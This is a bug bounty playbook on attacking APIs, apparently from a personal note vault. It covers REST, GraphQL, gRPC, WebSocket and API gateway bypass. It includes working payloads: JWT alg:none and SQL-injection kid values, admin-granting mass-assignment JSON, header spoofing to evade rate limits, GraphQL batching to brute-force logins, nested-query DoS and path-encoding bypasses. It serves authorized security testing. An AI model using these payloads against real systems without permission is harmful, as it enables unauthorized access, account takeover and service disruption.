---
type: reference
category: playbook
tags: [api, rest, graphql, grpc, websocket, gateway-bypass, methodology, 2026]
source: https://bugbounty.info/Attack-Surface/API/
author: aussinfosec (The Bug Bounty Playbook)
published: 2026-03-19
added: 2026-04-06
---

# API Attack Surface Playbook

> **Core concept: APIs are where the real money is.**
> Most modern apps are thin client + backend API -- testing the API = testing the app itself.
> If the target has both a Web app and a Mobile app, they usually share the same API, and the mobile client often has fewer validations or more hidden endpoints.

---

## API Testing vs Web App Testing Differences

| Aspect | Web App Testing | API Testing |
|--------|----------------|-------------|
| Interface | UI flows + session cookie | Direct raw JSON/protobuf |
| Versioning | Single version | `/api/v1/` may have defenses that `/api/v2/` lacks (or vice versa) |
| Field binding | More explicit | ORM auto-binding -> mass assignment is frequent |
| Rate limiting | Usually on login page | Most endpoints forget to set it |
| Authorization | Set per route | GraphQL is per-resolver; one miss and it breaks |

**Methodology shift: don't think "pages", think "objects and operations"**
- What objects does this API expose?
- What operations can I perform on them?
- What operations is my account actually authorized to execute?

---

## Quick Wins Checklist (Applicable to All API Types)

- [ ] Enumerate versions: `v1`, `v2`, `v3`, `beta`, `internal`, `legacy`
- [ ] Switch HTTP method: GET -> POST -> PUT -> PATCH -> DELETE
- [ ] Remove or downgrade auth header, observe if data is still returned
- [ ] Add unusual headers: `X-Internal: true`, `X-Forwarded-For: 127.0.0.1`, `X-Admin: true`
- [ ] Find documentation: `/swagger.json`, `/openapi.json`, `/api-docs`, `/graphql`, `/graphiql`
- [ ] Compare mobile app traffic vs web app traffic, find endpoint differences

---

## REST API

### Priority Testing Order
1. **BOLA/IDOR** (highest frequency + highest impact)
2. **Mass Assignment**
3. **Auth Bypass / JWT**
4. **Rate Limiting**

### Endpoint Discovery

```bash
# Kiterunner (route brute-forcing)
kr scan https://api.target.com -w routes-large.kite

# ffuf (alternative)
ffuf -u https://api.target.com/api/FUZZ -w /path/to/wordlist.txt

# Find API specs
/swagger.json
/openapi.json
/.well-known/openapi
/api-docs
```

Predicting endpoint format:
```
/api/v1/users
/api/v2/users
/api/internal/users
```

### BOLA / IDOR

Modify numeric IDs to access other users' resources:
```
GET /api/v1/orders/1337 -> change to /api/v1/orders/1338
GET /api/v1/users/me/profile -> change to /api/v1/users/42/profile
```

> Warning: UUID does not mean secure: UUIDs may leak from other API responses and can still be attempted

### Auth Bypass / JWT

```bash
# JWT alg:none
header: {"alg":"none","typ":"JWT"}
# Remove signature, keep trailing dot

# RS256 -> HS256 confusion
# Use the server's RSA public key as HMAC secret to sign

# kid header injection
{"kid": "../../dev/null"}
{"kid": "' UNION SELECT 'attacker_key' --"}

# API key leakage
# JS files, git history, trufflehog scan
trufflehog git https://github.com/target/repo
```

### Mass Assignment

Framework auto-binds request body to model -> try adding hidden fields:
```json
{
  "username": "test",
  "password": "test",
  "role": "admin",
  "is_verified": true,
  "credit_balance": 99999
}
```

### Rate Limiting Bypass

```bash
# IP rotation via header
-H "X-Forwarded-For: 1.2.3.4"
-H "X-Real-IP: 5.6.7.8"
-H "X-Originating-IP: 9.10.11.12"

# Account rotation (OTP / password reset)
# Encoding variants to bypass per-endpoint counting
```

Key targets for testing: password reset, OTP verification, login attempts

---

## GraphQL

### Vulnerability Priority Order
1. **Auth Gaps in Resolvers** (highest impact)
2. **IDOR via Object Relationship Chains**
3. **Batching Attack -> Rate Limit Bypass**
4. **Introspection Bypass**
5. **Query Complexity DoS**

### Introspection (Still Worth Trying Even If "Disabled")

```graphql
# Standard introspection
{ __schema { types { name fields { name } } } }

# Bypass methods when disabled
{ __type(name: "User") { fields { name } } }  # Single type query
# Switch HTTP method: POST -> GET
# Switch endpoint: /graphql -> /graphiql -> /api/graphql -> /v1/graphql
# Field suggestion oracle: enter wrong field name, check if error message suggests the correct name
```

### Auth Gap (Resolver Missing Authorization)

```graphql
# Direct admin query blocked -> bypass via relationship chain
query {
  user(id: "me") {
    orders {          # This level may have auth
      payment {       # This level's resolver forgot auth check
        cardNumber
        billingAddress
      }
    }
  }
}
```

### Batching Attack -> Rate Limit Bypass

```graphql
# Alias batching: execute multiple mutations in a single request
mutation {
  a1: login(username:"admin", password:"pass1") { token }
  a2: login(username:"admin", password:"pass2") { token }
  a3: login(username:"admin", password:"pass3") { token }
  # ... can go up to 100+
}

# Array batching (some implementations support this)
[
  {"query": "mutation { login(...) }"},
  {"query": "mutation { login(...) }"}
]
```

### Query Complexity DoS

```graphql
# Deep nesting until server crashes
{
  user {
    friends {
      friends {
        friends {
          friends { id name }
        }
      }
    }
  }
}
```

### Mutation Testing Checklist

- [ ] Delete other users (substitute user ID)
- [ ] Role escalation (`role: "admin"`)
- [ ] Fund transfer (modify from/to ID)
- [ ] Modify other users' data

### Tools

| Tool | Purpose |
|------|---------|
| InQL (Burp Extension) | Schema exploration, automated testing |
| GraphQL Voyager | Schema visualization |
| Clairvoyance | Reconstruct schema even with introspection disabled |
| graphw00f | GraphQL engine fingerprinting |
| BatchQL | Batching attack automation |
| gql-cli | CLI query tool |

**Hasura special note:** Check if `/console` is exposed; verify whether `x-hasura-admin-secret` header is required

---

## API Gateway Bypass

### Why It Works

The gateway handles auth/rate limit/WAF, and the backend trusts all requests that pass through the gateway.
If you can **hit the backend directly**, all defenses are bypassed.

### Finding the Backend's Real IP

```bash
# Certificate Transparency history
curl "https://crt.sh/?q=%.api.target.com&output=json" | jq '.[].name_value' | sort -u

# Shodan SSL search
shodan search 'ssl.cert.subject.cn:api.target.com' --fields ip_str,port

# ASN / CIDR scan
amass intel -org "Target Company" | grep CIDR

# Trigger errors to leak internal hostname
curl -X POST https://api.target.com/endpoint \
  -H "Content-Type: application/json" \
  -d '{"a":'   # Malicious JSON triggers parse error

# Response header fingerprinting
# x-amzn-requestid -> AWS API Gateway
# x-kong-* -> Kong
# server: nginx -> possibly nginx proxy
```

### Path Normalization Bypass

Gateway and backend parse paths differently:

```bash
# URL encoding
/api/v1/%61dmin/users          # a = %61
/api/v1/admin%2fusers          # %2f = /

# Path traversal
/api/v1/user/../admin/users
/api/v1/./admin/./users

# Double slash
/api/v1//admin/users
//api/v1/admin/users

# Null byte / special characters
/api/v1/admin%00/users
/api/v1/admin;/users           # ; acts as path separator on some servers

# Case difference
/API/V1/ADMIN/users            # gateway case-sensitive, backend case-insensitive
/Api/V1/Admin/Users
```

**Real-world example (Kong + Node.js):**
```
Kong route: /api/v1/admin -> 403 (non-admin role)
/api/v1/Admin -> Kong: no match, passes through; Node.js: case-insensitive match -> executes admin handler
```

### Header Manipulation

```bash
# IP-based auth bypass
curl https://api.target.com/internal/metrics \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Host header routing to different backend
curl https://target-backend-ip/ \
  -H "Host: internal-api.target.com"

# Method bypass (HEAD / GET often overlooked)
curl -X GET https://api.target.com/data    # POST has auth, GET may not
curl -X HEAD https://api.target.com/data

# Magic header fuzzing
-H "X-Gateway-Auth: skip"
-H "X-Internal: 1"
-H "X-API-Gateway: bypass"
-H "X-Original-URL: /admin"
```

### AWS API Gateway Specific

```bash
# URL format: https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/

# Try different stages (dev/staging usually have fewer defenses)
/dev/
/staging/
/v1/
/test/
/beta/
/internal/

# WAF bypass: double encoding
# API Gateway decodes then routes; WAF may only inspect the raw string
```

### Confirming Bypass Success

1. Remove all auth headers -> still get 200 = confirmed
2. Send 100 requests/10 seconds to rate-limited endpoint -> not throttled = confirmed
3. Send payloads that WAF should block (SQLi/XSS) -> backend returns a different error = confirmed

---

## gRPC

### Identifying gRPC Services

Look for in response headers:
- `content-type: application/grpc`
- `content-type: application/grpc+proto`
- `content-type: application/grpc-web+proto` (HTTP/1.1, easier to intercept)

### Server Reflection (Automatically Exposes Full Schema)

```bash
# Enumerate all services
grpcurl -plaintext target.com:50051 list

# View service methods
grpcurl -plaintext target.com:50051 list mypackage.MyService

# Call methods
grpcurl -plaintext -d '{"user_id": "1337"}' target.com:50051 mypackage.MyService/GetUser
```

### When Reflection Is Disabled

- Check mobile app, JS bundles, GitHub repos for `.proto` files
- Developers often commit `.proto` files to repos

```bash
# blackboxprotobuf: decode without schema
# Burp gRPC Extension: intercept gRPC-Web traffic
```

### Testing Focus

Same vulnerability types as REST:
- [ ] Remove auth header entirely
- [ ] Send empty token or fake token
- [ ] Try `x-service-account: backend-service` (internal service impersonation)
- [ ] IDOR: substitute user ID in request
- [ ] Undocumented methods (reflection can find all methods)

### Tools

| Tool | Purpose | Installation |
|------|---------|-------------|
| grpcurl | Enumerate + call methods | `brew install grpcurl` |
| blackboxprotobuf | Schema-less decoding | pip |
| Burp gRPC Extension | Intercept gRPC-Web | BApp Store |
| protoc | Compile proto + decode | `brew install protobuf` |

> Fewer gRPC testers -> lower competition -> worth prioritizing

---

## WebSocket

> Auth happens in the HTTP upgrade request, but subsequent WS messages often **skip authorization checks**.

### Attack Methods

```
1. Burp intercepts the WebSocket upgrade request
2. After connection is established, replay WS messages with a low-privilege account
3. Server assumes only admin would send this message -> no verification -> executes directly
```

### Testing Focus

- [ ] CSWSH (Cross-Site WebSocket Hijacking): missing Origin validation
- [ ] Auth bypass on messages: do WS messages after upgrade verify the token?
- [ ] Message injection: modify WS message fields (ID, role, action)
- [ ] Replay account A's actions using account B's WS session

---

## Complete Testing Checklist

### Reconnaissance Phase
- [ ] Find Swagger / OpenAPI spec (`/swagger.json`, `/openapi.json`, `/api-docs`)
- [ ] Version enumeration (v1, v2, beta, internal, legacy)
- [ ] Compare mobile vs web endpoints
- [ ] Find GraphQL endpoint (`/graphql`, `/graphiql`, `/api/graphql`)
- [ ] Check for gRPC (`content-type: application/grpc`)
- [ ] crt.sh + Shodan to find backend real IP

### REST
- [ ] BOLA/IDOR: substitute all object IDs
- [ ] Mass assignment: add hidden fields (role, admin, is_verified)
- [ ] JWT: alg:none, RS256->HS256, kid injection
- [ ] Rate limit bypass: XFF header rotation
- [ ] HTTP method switching

### GraphQL
- [ ] Introspection (direct + bypass methods)
- [ ] Auth gap: access protected data via relationship chains
- [ ] Batching attack: rate limit bypass
- [ ] IDOR on all mutations

### API Gateway
- [ ] Find backend real IP
- [ ] Path normalization bypass (encoding, case, double slash)
- [ ] Header manipulation (XFF, X-Internal, X-Original-URL)
- [ ] AWS stage enumeration (dev/staging/beta)

### gRPC
- [ ] Server reflection enumeration
- [ ] Find .proto files
- [ ] Auth header removal / IDOR

### WebSocket
- [ ] CSWSH
- [ ] Replay high-privilege WS messages with low-privilege account

---

## Related Notes

- [[Checklist - XSS Rat 2026]]
- [[Pattern - CORS Misconfiguration]]
- [[Pattern - User Enumeration]]
- [[Skill - web2-recon]]
- [[Skill - web2-vuln-classes]]
- [[Tool - JS-Tap]]

## Session-Mined Additions (2026-06-04)

- **SIT vs PROD OpenAPI diff**: Download SIT and PROD OpenAPI specs -> `diff` the endpoint lists -> endpoints actually present in PROD but not listed in the PROD spec = undocumented, prioritize for testing. See [[Pattern - OpenAPI Swagger Spec Info Disclosure]] for details.
